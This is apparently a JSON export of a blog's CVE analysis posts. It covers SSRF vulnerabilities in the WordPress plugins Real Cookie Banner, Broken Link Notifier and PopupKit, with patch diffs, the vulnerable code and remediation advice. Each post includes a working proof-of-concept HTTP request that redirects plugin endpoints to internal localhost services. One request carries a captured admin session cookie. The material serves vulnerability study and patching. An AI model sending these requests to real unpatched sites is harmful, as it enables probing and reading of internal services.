$requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } The patch adds input validation measures to prevent arbitrary URLs: Extract the job’s configured URL $jobDataUrl = $job-\u003edata-\u003eurl; =\u003e Obtain the domain that the job is allowed to operate on. Parse and validate the structure of the user-supplied URL $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } =\u003e Ensure the URL is valid and contains a host. Compare the host with the job’s domain $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } =\u003e If the host differs, return an error instead of proceeding. This restricts requests to the same allowed domain and prevents SSRF to other systems. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rrouteScanWithoutLogin() is registered as the callback for the REST API at /wp-json/\u003cnamespace\u003e/scanner/scan-without-login. register_rest_route( $namespace, '/scanner/scan-without-login', [ 'methods' =\u003e 'GET', 'callback' =\u003e [$this, 'routeScanWithoutLogin'], 'permission_callback' =\u003e [$this, 'permission_callback'], 'args' =\u003e [ 'url' =\u003e [ 'type' =\u003e 'string', 'required' =\u003e true, ], 'jobId' =\u003e [ 'type' =\u003e 'number', 'required' =\u003e true, ], ], ] ); The API uses GET, requires two parameters url (string) and jobId (number). Access is checked via permission_callback(): const MANAGE_MIN_CAPABILITY = 'manage_real_cookie_banner'; public function permission_callback() { return \\current_user_can(Core::MANAGE_MIN_CAPABILITY); } manage_real_cookie_banner is by default assigned to administrator, so the endpoint can only be invoked by users with that capability. The full endpoint path can be discovered by visiting /wp-json and searching for scan-without-login. API containing scan-without-login in /wp-json\r=\u003e Official endpoint: /wp-json/real-cookie-banner/v1/scanner/scan-without-login Note\rThe job in jobId suggests a running job tracked by jobId. I placed a breakpoint in routeScanWithoutLogin() and tested the feature, routing all requests through the BurpSuite proxy. Scanner is the function that calls this API. Debugger\rObserving BurpSuite’s HTTP history tab shows the request to the API being captured and listed in HTTP History: Request to API captured in HTTP History\r","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service with Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rUse the scanner feature and route requests through BurpSuite with an Administrator user. Capture the request to /wp-json/real-cookie-banner/v1/scanner/scan-without-login. Modify the URL and forward: GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838\u0026_locale=user\u0026url=http://localhost:8001/metadata\u0026jobId=65 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component X-WP-Nonce: 83df92a708 Connection: keep-alive Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951 Result: Content read from local service\r","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions ≤ 5.2.4 of Real Cookie Banner contain an SSRF vulnerability at the endpoint /wp-json/real-cookie-banner/v1/scanner/scan-without-login. routeScanWithoutLogin() accepts a url from the client, performs wp_remote_get(), and returns the raw body/headers, allowing an attacker with Administrator privileges (or a compromised admin session) to read and probe internal resources. Version 5.2.5 introduced host/domain checks (comparing the request host with the job’s domain) to block out-of-scope URLs and reduce risk; switching to wp_safe_remote_get() and adding additional validations is recommended for stronger protection. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUpdate the plugin to 5.2.5+ immediately. Do not trust client-supplied URLs — validate/normalize and apply a domain allowlist before fetching. Block requests to private/loopback IP ranges after DNS resolution (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, fc00::/7, etc.). Avoid forwarding internal credentials/cookies and avoid returning raw headers/body unless necessary. Use wp_safe_remote_get() with checks for redirects, timeouts, and SSL; log and limit body size before returning to the client. ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Real Cookie Banner Plugin \u003c= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Broken Link Notifier Plugin.","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Broken Link Notifier plugin for WordPress is vulnerable to Server‑Side Request Forgery in all versions up to and including 1.3.0 via the ajax_blinks() function which ultimately calls check_url_status_code(). This allows unauthenticated attackers to perform web requests to arbitrary addresses from the web application and can be used to query or modify information from internal services. CVE ID: CVE-2025-6851 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.3.0 Patched Versions: 1.3.1 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Broken Link Notifier Plugin ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Broken Link Notifier: 1.3.0 (vulnerable) and 1.3.1 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code In the vulnerable version, the check_url_status_code() function calls wp_remote_get() directly with the user-supplied URL without validating or checking the safety of the URL. This creates a SSRF (Server-Side Request Forgery) vulnerability. This version does not check the URL scheme, whether the host is valid, or whether the IP belongs to private/reserved ranges, so all requests are executed without restriction. public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Block SSRF to private/reserved ranges $unsafe = $this-\u003eis_url_unsafe( $link ); if ( $unsafe ) { return apply_filters( 'blnotifier_status', $unsafe ); } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code protected function is_url_unsafe( $url ) { $parts = wp_parse_url( $url ); if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: invalid or malformed URL', 'link' =\u003e $url ]; } $scheme = strtolower( $parts[ 'scheme' ] ); if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: unsupported URL scheme', 'link' =\u003e $url ]; } $host = $parts[ 'host' ]; $records = @dns_get_record( $host, DNS_A + DNS_AAAA ); $ips = []; if ( is_array( $records ) \u0026\u0026 count( $records ) ) { foreach ( $records as $record ) { if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'A' \u0026\u0026 ! empty( $record[ 'ip' ] ) ) { $ips[] = $record[ 'ip' ]; } if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'AAAA' \u0026\u0026 ! empty( $record[ 'ipv6' ] ) ) { $ips[] = $record[ 'ipv6' ]; } } } else { $resolved = gethostbyname( $host ); if ( $resolved \u0026\u0026 $resolved !== $host ) { $ips[] = $resolved; } } if ( empty( $ips ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: host could not be resolved', 'link' =\u003e $url ]; } foreach ( $ips as $ip ) { if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: resolved to internal or reserved IP address', 'link' =\u003e $url ]; } } return false; // Safe } // End is_url_unsafe() The patch added the is_url_unsafe() function. Before calling wp_remote_get(), the URL is checked in detail: only http and https schemes are allowed, the host is validated, DNS resolution is performed to obtain IPs, and any internal or reserved IP addresses are blocked. If the URL is invalid or unsafe, the function returns detailed block information and does not perform the request, thereby effectively preventing SSRF. The patch ensures only safe URLs are allowed to be fetched, reducing the risk of external attacks. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic function check_url_status_code( $url, $timeout = null ) { // Get the 'allow_redirects' option and sanitize it $allow_redirects = filter_var( get_option( 'blnotifier_allow_redirects' ), FILTER_VALIDATE_BOOLEAN ); // Determine the request method based on allow_redirects option $request_method = $allow_redirects ? 'GET' : 'HEAD'; // Force giving head for images, videos, and audio files if ( $request_method == 'GET' ) { $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) ); if ( in_array( $file_extension, $this-\u003eget_force_head_file_types() ) ) { $request_method = 'HEAD'; } } // User agent $user_agent = $this-\u003eget_user_agent( $url ); // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Check if from youtube if ( $watch_url = $this-\u003eis_youtube_link( $link ) ) { $link = 'https://www.youtube.com/oembed?format=json\u0026url='.$watch_url; } // The request args // See https://developer.wordpress.org/reference/classes/WP_Http/request/ $http_request_args = apply_filters( 'blnotifier_http_request_args', [ 'method' =\u003e $request_method, 'timeout' =\u003e $timeout, 'redirection' =\u003e absint( get_option( 'blnotifier_max_redirects', 5 ) ), 'httpversion' =\u003e '1.1', 'sslverify' =\u003e filter_var( get_option( 'blnotifier_ssl_verify', true ), FILTER_VALIDATE_BOOLEAN ), 'user-agent' =\u003e $user_agent ], $url ); // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } // Let's make invalid URL 0 codes broken if ( $code === 0 \u0026\u0026 ( $error == 'A valid URL was not provided.' || strpos( $error, 'cURL error 6: Could not resolve host' ) !== false ) ) { $code = 666; } // Possible Codes $codes = $this-\u003eget_status_codes(); // Files too large if ( $request_method == 'GET' ) { $content_length = wp_remote_retrieve_header( $response, 'content-length' ); if ( $content_length \u0026\u0026 $content_length \u003e 10 * 1024 * 1024 ) { // 10 MB $code = 413; } } // Bad links if ( in_array( $code, $this-\u003eget_bad_status_codes() ) ) { $type = 'broken'; // Warnings } elseif ( in_array( $code, $this-\u003eget_warning_status_codes() ) ) { $type = 'warning'; // Good links } else { $type = 'good'; } // Filter status $status = apply_filters( 'blnotifier_status', [ 'type' =\u003e $type, 'code' =\u003e $code, 'text' =\u003e ( $code !== 0 \u0026\u0026 ( isset( $codes[ $code ] ) \u0026\u0026 $codes[ $code ][ 'msg' ] != '' ) ) ? $codes[ $code ][ 'msg' ] : $error, 'link' =\u003e $url ] ); // Return the array return $status; } // End check_url_status_code The check_url_status_code() function is responsible for checking the status of a URL and classifying it as good, warning, or broken. Specifically, the function performs the following main steps: Retrieve configuration options Get the blnotifier_allow_redirects option from the database and convert it to boolean → Decide whether to use GET or HEAD for the request. Choose request method If allow_redirects = true, default to GET. If the URL is a media file (image, video, audio), the function forces HEAD to avoid downloading large files. Determine user-agent Calls $this-\u003eget_user_agent() to get an appropriate user-agent for the request. Normalize the URL If the URL starts with / → prepend home_url() to form an absolute URL. If the URL is a YouTube link, convert it to the oembed endpoint to obtain information safely without accessing the video directly. Configure the request: Build the $http_request_args array containing request parameters: method (GET/HEAD) timeout redirection (max number of redirects) sslverify (whether to verify SSL) user-agent Perform the request Call wp_remote_get($link, $http_request_args) to obtain the response. If no error → retrieve the status code from the server. If error → retrieve the error message. Handle invalid URLs Some basic errors such as invalid URL provided or host not resolvable → assign special code 66","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph LR\rA[Anonymous Client sends URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get with user-supplied URL]\rE --\u003e F[Response from server]\rgraph LR\rA[Anonymous Client sends URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get with user-supplied URL]\rE --\u003e F[Response from server]\rgraph LR\rA[Anonymous Client sends URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get with user-supplied URL]\rE --\u003e F[Response from server]\rgraph LR\rA[Anonymous Client sends URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get with user-supplied URL]\rE --\u003e F[Response from server]\r","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service using Python from flask import Flask, request import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rVisit the homepage and obtain the nonce Send a POST request to the endpoint POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=blnotifier_blinks\u0026nonce=87f4d1ef16\u0026source_url=http://localhost:8001/\u0026header_links[0]=http://127.0.0.1:8001/delete?id=1 Result: Successfully sent request to local service\r","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rBroken Link Notifier versions ≤1.3.0 are vulnerable to SSRF: the endpoint allows anonymous users to supply URLs, which leads to wp_remote_get() being called against internal services. Version 1.3.1 added DNS/IP checks and restrictions, preventing SSRF before the request is performed. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUpgrade immediately to ≥1.3.1. Do not trust client-provided URLs — validate/allowlist before fetching. Block internal IPs (resolve DNS, block private/reserved ranges). Restrict endpoint privileges (do not allow anonymous). Return status instead of raw body when content is not needed. ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Broken Link Notifier Plugin \u003c= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 2.1.4. The cause is insufficient validation of URLs supplied via the url parameter. This allows unauthenticated attackers to make web requests to arbitrary addresses originating from the web application, which can be used to query or modify information from internal services, as well as conduct network reconnaissance. The vulnerability was partially patched in version 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) and 2.1.5 (patched). Diff tool - Meld or any diff tool to compare differences between versions. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rBecause some source was partially patched in 2.1.4, we will analyze using version 2.1.3. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } In version 2.1.3, the plugin defines a POST API with permission_callback =\u003e __return_true, allowing any user, including anonymous users, to invoke fetch_external_content() with a required url parameter. This function uses wp_remote_get to send a request to the provided URL and returns the response body. Because there is no mechanism to control or filter internal URLs, an attacker can send requests to internal services, leading to SSRF exploitable by anonymous users. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } In the 2.1.5 fix, the plugin made several changes to mitigate SSRF risk: Changed the endpoint from /live-preview to /live-preview-template. Replaced wp_remote_get() with wp_safe_remote_get(), which helps WordPress automatically block requests to internal addresses such as localhost, 127.0.0.1, or 169.254.*. As a result, user-supplied requests to internal resources on the server are blocked, preventing straightforward SSRF exploitation. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rget_routes() is invoked inside register_routes(): protected $namespace = 'pbb/v1'; public function register_routes() { $routes = $this-\u003eget_routes(); foreach ($routes as $route) { register_rest_route( $this-\u003enamespace, $route['endpoint'], [ 'methods' =\u003e $route['methods'], 'callback' =\u003e [$this, $route['callback']], 'permission_callback' =\u003e isset($route['permission_callback']) ? $route['permission_callback'] : [$this, 'permission_callback'], ] ); } } public function permission_callback(): bool { return current_user_can('manage_options'); } When register_routes() runs, all routes returned by get_routes() are registered with the WordPress REST API via register_rest_route(). Here: Each route maps to an endpoint, method, and callback. If a route lacks a permission_callback, the plugin defaults to $this-\u003epermission_callback, requiring the manage_options capability (typically admin). However, in 2.1.3, the /live-preview route is explicitly declared with permission_callback =\u003e '__return_true', which bypasses the permission check, allowing anyone (including anonymous users) to call that API. When a POST request is sent to /wp-json/pbb/v1/live-preview, fetch_external_content() executes. It reads the url parameter from the request, performs a fetch request to that address, and returns the response body. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service using Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rSend a POST request to the endpoint POST /wp-json/pbb/v1/live-preview HTTP/1.1 Host: localhost ... url=http://localhost:8001/metadata Result: Content read from local service\r","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersions ≤ 2.1.4 of PopupKit are vulnerable to SSRF: the /wp-json/pbb/v1/live-preview endpoint allows anonymous users to call fetch_external_content() with a client-provided url; the function uses wp_remote_get() and returns the response body directly, enabling access to internal services. Version 2.1.5 switched to wp_safe_remote_get() and restricted access to admin-only, which reduces risk. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rUpdate to 2.1.5+. Do not trust client URLs — validate/allowlist before fetching. Use wp_safe_remote_get() and add additional checks (redirects, DNS). Do not use permission_callback =\u003e __return_true; restrict permissions. Do not return raw response bodies unless necessary. ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress PopupKit Plugin \u003c= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Spectra Plugin.","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 